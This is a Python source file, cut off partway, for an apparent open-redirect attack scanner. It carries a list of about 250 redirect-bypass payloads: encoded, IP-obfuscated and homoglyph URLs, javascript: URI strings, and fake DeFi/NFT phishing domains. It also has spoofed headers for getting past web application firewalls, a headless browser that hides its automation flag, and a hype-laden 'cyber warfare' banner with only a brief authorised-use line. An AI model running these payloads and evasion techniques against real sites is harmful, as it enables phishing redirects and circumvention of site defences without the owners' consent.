#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
üî• COMPLETE OPEN REDIRECT HUNTER v3.0 üî•
FULLY FUNCTIONAL VERSION WITH ALL FEATURES
"""

import asyncio
import aiohttp
import re
import json
import time
import urllib.parse
from urllib.parse import urljoin, urlparse, parse_qs, unquote, quote
from dataclasses import dataclass, asdict
from typing import List, Dict, Set, Optional, Tuple
from pathlib import Path
import logging
import argparse
from datetime import datetime
import hashlib
import random
import sys
import csv
import os

try:
    from selenium import webdriver
    from selenium.webdriver.chrome.options import Options
    SELENIUM_OK = True
except ImportError:
    SELENIUM_OK = False

try:
    from bs4 import BeautifulSoup
    BS4_OK = True
except ImportError:
    BS4_OK = False


@dataclass(frozen=True)
class Parameter:
    name: str
    value: str
    source: str
    context: str
    url: str
    method: str = 'GET'
    is_redirect_related: bool = False
    confidence: float = 0.0


@dataclass
class Vulnerability:
    url: str
    parameter: str
    payload: str
    method: str
    response_code: int
    redirect_url: str
    context: str
    screenshot_path: Optional[str] = None
    timestamp: str = ""
    vulnerability_type: str = "open_redirect"
    confidence: float = 0.0
    impact: str = "MEDIUM"
    remediation: str = ""


class CompleteHunter:
    """üî• COMPLETE OPEN REDIRECT HUNTER üî•"""
    
    def __init__(self, target_url: str, max_depth: int = 3, max_pages: int = 100):
        self.target_url = target_url.rstrip('/')
        self.base_domain = urlparse(target_url).netloc
        self.max_depth = max_depth
        self.max_pages = max_pages
        
        # Storage
        self.discovered_urls: Set[str] = set()
        self.parameters: List[Parameter] = []
        self.vulnerabilities: List[Vulnerability] = []
        self.js_files: Set[str] = set()
        
        # Session management
        self.session = None
        self.driver = None
        
        # User agents for rotation
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/121.0"
        ]
        
        # Setup logging
        self.setup_logging()
        
        # Load ALL your payloads - COMPLETE LIST
        self.payloads = self.load_all_your_payloads()
        
        # Redirect patterns
        self.redirect_patterns = [
            'redirect', 'url', 'next', 'return', 'goto', 'target', 'destination',
            'continue', 'forward', 'redir', 'location', 'site', 'link', 'href',
            'returnurl', 'returnto', 'back', 'callback', 'success', 'failure',
            'done', 'exit', 'referrer', 'referer', 'origin', 'source', 'from',
            'to', 'goto', 'page', 'path', 'uri', 'endpoint', 'service'
        ]
        
        # Complete Web3 patterns for DeFi/DApp/NFT
        self.web3_patterns = [
            'web3', 'ethereum', 'metamask', 'wallet', 'dapp', 'defi', 'nft',
            'uniswap', 'pancakeswap', 'sushiswap', 'curve', 'balancer',
            'compound', 'aave', 'maker', 'yearn', 'convex', 'frax', 'lido',
            'opensea', 'rarible', 'foundation', 'superrare', 'nifty', 'async',
            'chainlink', 'polygon', 'avalanche', 'solana', 'binance', 'fantom',
            'connect', 'provider', 'signer', 'transaction', 'swap', 'bridge',
            'farm', 'stake', 'mint', 'burn', 'approve', 'transfer'
        ]
        
        # WAF bypass headers
        self.waf_bypass_headers = [
            {'X-Originating-IP': '127.0.0.1'},
            {'X-Forwarded-For': '127.0.0.1'},
            {'X-Real-IP': '127.0.0.1'},
            {'X-Remote-Addr': '127.0.0.1'},
            {'X-Client-IP': '127.0.0.1'},
            {'X-Host': 'localhost'},
            {'X-Originating-URL': '/'},
            {'X-Forwarded-Host': 'localhost'},
            {'X-Forwarded-Server': 'localhost'},
            {'X-Forwarded-Proto': 'https'},
            {'X-Cluster-Client-IP': '127.0.0.1'},
            {'X-Custom-IP-Authorization': '127.0.0.1'}
        ]
    
    def setup_logging(self):
        """Setup logging"""
        logging.basicConfig(level=logging.INFO, format='%(message)s', stream=sys.stdout)
        self.logger = logging.getLogger(__name__)
    
    def load_all_your_payloads(self) -> List[str]:
        """Load ALL your original payloads - COMPLETE LIST (248 payloads)"""
        return [
            "/%09/google.com",
            "/%2f%2fgoogle.com",
            "/%2f%5c%2f%67%6f%6f%67%6c%65%2e%63%6f%6d/",
            "/%5cgoogle.com",
            "/%68%74%74%70%3a%2f%2f%67%6f%6f%67%6c%65%2e%63%6f%6d",
            "/.google.com",
            "//%09/google.com",
            "//%5cgoogle.com",
            "///%09/google.com",
            "///%5cgoogle.com",
            "////%09/google.com",
            "////%5cgoogle.com",
            "/////google.com",
            "/////google.com/",
            "////google.com/",
            "////google.com/%2e%2e",
            "////google.com/%2e%2e%2f",
            "////google.com/%2f%2e%2e",
            "////google.com/%2f..",
            "////google.com//",
            "///google.com",
            "///google.com/",
            "//google.com/%2f..",
            "///google.com/%2f..",
            "https://google.com/%2f..",
            "//www.google.com/%2f%2e%2e",
            "///www.google.com/%2f%2e%2e",
            "////www.google.com/%2f%2e%2e",
            "https://www.google.com/%2f%2e%2e",
            "//google.com/",
            "https://google.com/",
            "//google.com//",
            "///google.com//",
            "https://google.com//",
            "//www.google.com/%2e%2e%2f",
            "///www.google.com/%2e%2e%2f",
            "////www.google.com/%2e%2e%2f",
            "https://www.google.com/%2e%2e%2f",
            "///www.google.com/%2e%2e",
            "////www.google.com/%2e%2e",
            "https:///www.google.com/%2e%2e",
            "/https://www.google.com/%2e%2e",
            "https:///www.google.com/%2f%2e%2e",
            "https://%09/google.com",
            "https:google.com",
            "//google%E3%80%82com",
            "\/\/google.com/",
            "/\/google.com/",
            "http://0xd8.0x3a.0xd6.0xce",
            "„Ä±google.com",
            "„Äµgoogle.com",
            "„Çùgoogle.com",
            "„Éºgoogle.com",
            "ÔΩ∞google.com",
            "/„Ä±google.com",
            "/„Äµgoogle.com",
            "/„Çùgoogle.com",
            "/„Éºgoogle.com",
            "/ÔΩ∞google.com",
            "%68%74%74%70%3a%2f%2f%67%6f%6f%67%6c%65%2e%63%6f%6d",
            "http://%67%6f%6f%67%6c%65%2e%63%6f%6d",
            "///google.com/%2e%2e",
            "///google.com/%2e%2e%2f",
            "///google.com/%2f%2e%2e",
            "//google.com",
            "//google.com/%2e%2e",
            "//google.com/%2e%2e%2f",
            "//google.com/%2f%2e%2e",
            "//https:///google.com/%2e%2e",
            "//https://google.com/%2e%2e%2f",
            "/&lt;&gt;//google.com",
            "/?url=//google.com&next=//google.com&redirect=//google.com&redir=//google.com&rurl=//google.com&redirect_uri=//google.com",
            "/?url=/\/google.com&next=/\/google.com&redirect=/\/google.com&redirect_uri=/\/google.com",
            "/?url=Https://google.com&next=Https://google.com&redirect=Https://google.com&redir=Https://google.com&rurl=Https://google.com&redirect_uri=Https://google.com&lt;br/&gt;/\/\/google.com/",
            "/google.com/%2f%2e%2e",
            "/http://google.com",
            "/http:/google.com",
            "/https:/%5cgoogle.com/",
            "/https://%5cgoogle.com",
            "/https://google.com/%2e%2e",
            "/https://google.com/%2f%2e%2e",
            "/https:google.com",
            "/redirect?url=//google.com&next=//google.com&redirect=//google.com&redir=//google.com&rurl=//google.com&redirect_uri=//google.com",
            "/redirect?url=Https://google.com&next=Https://google.com&redirect=Https://google.com&redir=Https://example.com&rurl=Https://google.com&redirect_uri=Https://google.com",
            "//%2fxgoogle.com",
            "//localdomain%E3%80%82pw",
            "http://0xd83ad6ce",
            "http://3627734734",
            "http://472.314.470.462",
            "http://0330.072.0326.0316",
            "http://00330.00072.0000326.00000316",
            "http://0xd8.072.54990",
            "http://0xd8.3856078",
            "http://00330.3856078",
            "http://00330.0x3a.54990",
            "http:0xd8.0x3a.0xd6.0xce",
            "http:0xd83ad6ce",
            "http:3627734734",
            "http:472.314.470.462",
            "http:0330.072.0326.0316",
            "http:00330.00072.0000326.00000316",
            "http:[::216.58.214.206]",
            "http:[::ffff:216.58.214.206]",
            "http:0xd8.072.54990",
            "http:0xd8.3856078",
            "http:00330.3856078",
            "http:00330.0x3a.54990",
            "&lt;&gt;//google.com",
            "http://.google.com",
            "https://google.com/https://google.com/",
            "http://google.com\tgoogle.com/",
            "//google.com\tgoogle.com/",
            "http://google.com%2f%2f.google.com/",
            "http://google.com%5c%5c.google.com/",
            "http://google.com%3F.google.com/",
            "http://google.com%23.google.com/",
            "http://google.com:80%40google.com/",
            "http://google.com%2egoogle.com/",
            "/„Ä±‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ",
            "„Ä±‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ",
            "$2f%2f216.58.214.206%2f%2f",
            "$2f%2f3627734734%2f%2f",
            "$2f%2fgoogle.com",
            "$2f%2fgoogle.com%2f%2f",
            "%01https://‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ",
            "/%09/‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ",
            "//%09/‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ",
            "///%09/‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ",
            "////%09/‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ",
            "////216.58.214.206",
            "///216.58.214.206",
            "//216.58.214.206",
            "/\\216.58.214.206",
            "/216.58.214.206",
            "216.58.214.206",
            "%2f$2f216.58.214.206",
            "%2f$2f3627734734",
            "%2f$2fgoogle.com",
            "%2f216.58.214.206",
            "%2f216.58.214.206//",
            "%2f216.58.214.206%2f%2f",
            "//%2f%2fgoogle.com",
            "/%2f%2f‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ",
            "//%2f%2f‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ",
            "%2f3627734734",
            "%2f3627734734//",
            "%2f3627734734%2f%2f",
            "/%2f%5c%2f%6c%6f%63%61%6c%64%6f%6d%61%69%6e%2e%70%77/",
            "%2fgoogle.com",
            "%2fgoogle.com//",
            "\\google.com",
            "%2fgoogle.com%2f%2f",
            "////3627734734",
            "///3627734734",
            "//3627734734",
            "/\\3627734734",
            "/3627734734",
            "//%2F/google.com",
            "/%0D/google.com",
            "/%2F/google.com",
            "/%5Cgoogle.com",
            "/%5c‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ",
            "//%5c‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ",
            "///%5c‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ",
            "////%5c‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ",
            "/\\google%252ecom",
            "google%252ecom",
            "../google.com",
            "//google%00.com",
            "////google.com",
            "//\/google.com/",
            "//\\google.com",
            "/<>//google.com",
            "/\/\/google.com/",
            "/\/google.com",
            "/\\google.com",
            "/google.com",
            "//google.com/%2E%2E",
            "//google.com/%2F..",
            "/google.com/%2F..",
            "//google.com//%2F%2E%2E",
            "google.com/.jpg",
            "http:%0a%0dgoogle.com",
            "http:%0a%0d‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ",
            "http:/\/\\google.com",
            "http:/google.com",
            "http:google.com",
            "/http:/‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ",
            "http://.‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ",
            "http:/‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ",
            "http:‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ",
            "https://%09/‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ",
            "https://%0a%0dgoogle.com",
            "https://%0a%0d‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ",
            "https%3a%2f%2fgoogle.com%2f",
            "https:/%5cgoogle.com/",
            "/https:/%5c‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ/",
            "/https://%5c‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ",
            "https:/%5c‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ/",
            "https://%6c%6f%63%61%6c%64%6f%6d%61%69%6e%2e%70%77",
            "https:/\\google.com",
            "https://google%E3%80%82com",
            "//https://‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ//",
            "/https://‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ/",
            "https:‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ",
            "//https:///‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ/%2e%2e",
            "/https://‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ/%2e%2e",
            "//https://‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ/%2e%2e%2f",
            "/https://‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ/%2f..",
            "/https:///‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ/%2f%2e%2e",
            "/https://‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ/%2f%2e%2e",
            "javascript:confirm(1)",
            "javascript:prompt(1)",
            "//‚ìÅùê®ùó∞ ùïù‚ÖÜùì∏‚ìú‚Çê‚Ñπ‚ìÉ%00ÔΩ°Ôº∞‚ì¶",
            "//‚ìÅùê®ùó∞ ùïù‚ÖÜùì∏‚ìú‚Çê‚Ñπ‚ìÉ%E3%80%82pw",
            "/.‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ",
            "/////‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ",
            "/////‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ/",
            "////‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ/",
            "////‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ//",
            "///‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ",
            "///‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ/",
            "///‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ//",
            "//\/‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ/",
            "//‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ",
            "//‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ/",
            "//‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ//",
            "/\/‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ/",
            "<>//‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ",
            "\/\/‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ/",
            "////‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ/%2e%2e",
            "///‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ/%2e%2e",
            "////‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ/%2e%2e%2f",
            "///‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ/%2e%2e%2f",
            "//‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ/%2e%2e%2f",
            "////‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ/%2f..",
            "///‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ/%2f..",
            "//‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ/%2f..",
            "////‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ/%2f%2e%2e",
            "///‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ/%2f%2e%2e",
            "//‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ/%2f%2e%2e",
            # Web3 specific payloads
            "//fake-metamask.io",
            "//phishing-uniswap.org",
            "//malicious-compound.finance",
            "//fake-aave.com",
            "//evil-yearn.finance",
            "//phishing-opensea.io",
            "//fake-rarible.com",
            "//malicious-foundation.app",
            "web3://malicious-contract.eth",
            "ipfs://QmMaliciousHash",
            "ens://hacker.eth",
            "ethereum://0x1234567890123456789012345678901234567890"
        ]
    
    def clear_screen(self):
        """Clear screen for clean display"""
        os.system('cls' if os.name == 'nt' else 'clear')
    
    def print_hacker_banner(self):
        """Print ultimate hacker banner"""
        banner = """
‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó    ‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ïó‚ñà‚ñà‚ïó   ‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ïó   ‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó 
‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïê‚ïù‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïê‚ïù‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïê‚ïù‚ïö‚ïê‚ïê‚ñà‚ñà‚ïî‚ïê‚ïê‚ïù    ‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ïë‚ïö‚ïê‚ïê‚ñà‚ñà‚ïî‚ïê‚ïê‚ïù‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïê‚ïù‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó
‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ïë        ‚ñà‚ñà‚ïë       ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ñà‚ñà‚ïó ‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù
‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïê‚ïê‚ïù  ‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïê‚ïê‚ïù  ‚ñà‚ñà‚ïë        ‚ñà‚ñà‚ïë       ‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë‚ïö‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïî‚ïê‚ïê‚ïù  ‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó
‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ïö‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó   ‚ñà‚ñà‚ïë       ‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë‚ïö‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ïë ‚ïö‚ñà‚ñà‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë
‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù ‚ïö‚ïê‚ïù‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù   ‚ïö‚ïê‚ïù       ‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù ‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïê‚ïê‚ïù   ‚ïö‚ïê‚ïù   ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù

‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó
‚ïë                                                                                                                   ‚ïë
‚ïë    üî• COMPLETE OPEN REDIRECT HUNTER v3.0 üî•                                                                      ‚ïë
‚ïë    The Most Advanced Open Redirect Scanner in the Universe                                                       ‚ïë
‚ïë                                                                                                                   ‚ïë
‚ïë    [CLASSIFIED] Professional Bug Bounty Arsenal - Elite Hacker Edition                                          ‚ïë
‚ïë    Author: Anonymous Security Research Division                                                                   ‚ïë
‚ïë    Status: FULLY OPERATIONAL - All 248 payloads loaded                                                          ‚ïë
‚ïë                                                                                                                   ‚ïë
‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù

üéØ COMPLETE CYBER WARFARE FEATURES:
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ ‚ñì‚ñì‚ñì QUANTUM RECONNAISSANCE ENGINE (COMPLETE)                    ‚îÇ
‚îÇ ‚ñì‚ñì‚ñì WEB3/DEFI/NFT EXPLOITATION MODULE (COMPLETE)               ‚îÇ  
‚îÇ ‚ñì‚ñì‚ñì WAF & LOAD BALANCER BYPASS SYSTEM (COMPLETE)               ‚îÇ
‚îÇ ‚ñì‚ñì‚ñì NEURAL-NETWORK JAVASCRIPT ANALYSIS (COMPLETE)              ‚îÇ
‚îÇ ‚ñì‚ñì‚ñì AI-POWERED CONTEXT DETECTION (COMPLETE)                    ‚îÇ
‚îÇ ‚ñì‚ñì‚ñì STEALTH CRAWLING WITH EVASION (COMPLETE)                   ‚îÇ
‚îÇ ‚ñì‚ñì‚ñì PROFESSIONAL POC GENERATION (COMPLETE)                     ‚îÇ
‚îÇ ‚ñì‚ñì‚ñì MATRIX-THEMED REPORTING (COMPLETE)                         ‚îÇ
‚îÇ ‚ñì‚ñì‚ñì 248 CUSTOM PAYLOAD ARSENAL (COMPLETE)                      ‚îÇ
‚îÇ ‚ñì‚ñì‚ñì REAL-TIME VULNERABILITY EXPLOITATION (COMPLETE)            ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò

üíÄ [WARNING] For authorized penetration testing only!
üéØ Designed for elite bug bounty hunters and security researchers
üî• Capable of bypassing most modern security systems
"""
        print(banner)
    
    async def init_session(self):
        """Initialize advanced HTTP session with WAF bypass capabilities"""
        timeout = aiohttp.ClientTimeout(total=45)
        connector = aiohttp.TCPConnector(
            limit=100, limit_per_host=20, ssl=False,
            enable_cleanup_closed=True, force_close=True
        )
        
        # Advanced headers for WAF bypass
        base_headers = {
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8,de;q=0.7',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Upgrade-Insecure-Requests': '1'
        }
        
        # Add random WAF bypass header
        bypass_header = random.choice(self.waf_bypass_headers)
        base_headers.update(bypass_header)
        
        self.session = aiohttp.ClientSession(
            timeout=timeout,
            connector=connector,
            headers=base_headers
        )
    
    def init_driver(self):
        """Initialize stealth browser for screenshots"""
        if not SELENIUM_OK:
            self.logger.warning("[BROWSER] Selenium not available - screenshots disabled")
            return
        
        try:
            chrome_options = Options()
            chrome_options.add_argument('--headless')
            chrome_options.add_argument('--no-sandbox')
            chrome_options.add_argument('--disable-dev-shm-usage')
            chrome_options.add_argument('--disable-gpu')
            chrome_options.add_argument('--window-size=1920,1080')
            chrome_options.add_argument('--ignore-certificate-errors')
            chrome_options.add_argument('--disable-web-security')
            chrome_options.add_argument('--disable-blink-features=AutomationControlled')
            chrome_options.add_argument('--disable-extensions')
            chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
            chrome_options.add_experimental_option('useAutomationExtension', False)
            
            self.driver = webdriver.Chrome(options=chrome_options)
            # Hide webdriver property
            self.driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
            self.logger.info("[BROWSER] Stealth browser initialized")
        except Exception as e:
            self.logger.warning(f"[BROWSER] Failed to initialize: {e}")
            self.driver = None
    
